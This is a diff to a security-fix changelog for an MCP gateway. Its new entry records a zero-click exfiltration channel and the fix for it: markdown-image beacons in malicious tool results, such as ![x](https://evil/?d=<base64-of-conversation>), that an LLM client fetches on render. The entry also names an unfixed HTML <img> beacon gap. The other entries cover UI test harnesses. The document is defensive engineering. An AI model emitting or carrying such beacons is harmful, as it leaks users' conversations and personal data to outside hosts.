@@ -1331,6 +1331,26 @@ frontend build + Playwright) before marking any scratchpad item `[x]`.
   (CHG-0068/0070). Evidence `mcp-parallel/findings/backstop-p-ext-withhold-audit/`. RESIDUAL: the
   domain-not-allowlisted 403 (before the `_ext_audit` closure, static input reject) left unaudited by design.
 
+- **CHG-0096** (2026-07-03) — **HIGH zero-click exfil: MCP tool RESULTS not defanged for auto-render EXFIL
+  BEACONS**. The chat output guard defangs markdown-image `![x](https://evil/?d=<data>)` / bare beacon URLs
+  via `neutralize_exfil_channels`, but the MCP result scan (orchestrator `_scan_text_tier1`) only ran
+  `redact_all` — masking recognized PII/secrets but NOT the beacon STRUCTURE. A malicious upstream result
+  with `![x](https://evil/?d=<base64-of-conversation>)` (opaque payload the regexes miss) egressed as a live
+  auto-render beacon a markdown/LLM client AUTO-FETCHES on render → zero-click exfil; this egress BYPASSES the
+  chat output guard (separate API surface). **FIX:** (1) `_scan_text_tier1` runs `neutralize_exfil_channels`
+  on the RAW text (before `redact_all` so the payload is visible to `_url_smuggles_data`), adds an `exfil`
+  finding, sets the mutation to `redact_all(neutralized)` (if PII/secret present) or the neutralized text;
+  gated `enforcement != "monitor"`. (2) tier1 only APPLIES a mutation under `redact`, so added
+  `_findings_have_exfil` + OR'd into the E12 result-redaction FLOOR trigger at all 3 sites (CHG-0074 pattern)
+  so the defang fires under the default `tag` posture. NEW TEST `test_mcp_result_exfil_beacon_defang.py` (10).
+  Gate: 10 + 1568 gateway passed, 0 failed; broker 108. Byte-level: `![a](.../?leak=john.doe@corp.example)` →
+  `[a](https://attacker.io/[exfil-redacted])`; 5 benign unchanged. ORACLE NOTE: aidefence blind here (rated
+  the raw `?leak=<email>` beacon `hasPII=false`); byte-level + behavior test authoritative. touched:
+  owning-session MCP scan core (orchestrator + CHG-0074/E12 floor); reuses `output_guard`. Evidence
+  `mcp-parallel/findings/backstop-p-result-exfil-beacon/`. RESIDUAL: an HTML `<img>`/srcset beacon nested in a
+  JSON result field is NOT defanged (whole-payload JSON scan escapes the attribute quotes; HTML regexes miss
+  them) — markdown/bare-URL ARE defanged; per-field neutralization is a future item.
+
 - MCP-PAGE-CP01 | scripts/ralph/mcp_page_typesim.mjs (new) | WHAT: reusable type-sim Playwright harness (keyboard.type delay:40 / clear via Ctrl+A→Delete, NEVER fill; exports typeSim/login/openRegisterDialog) | WHY: comma-drop/focus-loss modal bug only reproduces under realistic keystrokes; fill() masks it | NOW DOES: CP01 smoke green (type 'a,b,c' into name → value correct, commas 2/2, focus held) | touched: none (new) | VERIFY: node scripts/ralph/mcp_page_typesim.mjs → ok:true
 
 - MCP-PAGE-CP02 | scripts/ralph/mcp_page_cp02_args_repro.mjs (new) | WHAT: type-sim repro of Args comma-drop | WHY: CP02 prove bug | NOW DOES: REPRODUCED — type "a,b,c --flag,x" into Args → "abc--flagx", commas 0/3 + space dropped, focus KEPT (separator-drop, not remount); name/url/command unaffected → bug is specific to the comma-separated Args onChange (root-cause CP04) | touched: none (MCPConnectorPanel Args input suspect) | VERIFY: node scripts/ralph/mcp_page_cp02_args_repro.mjs → bugReproduced:true
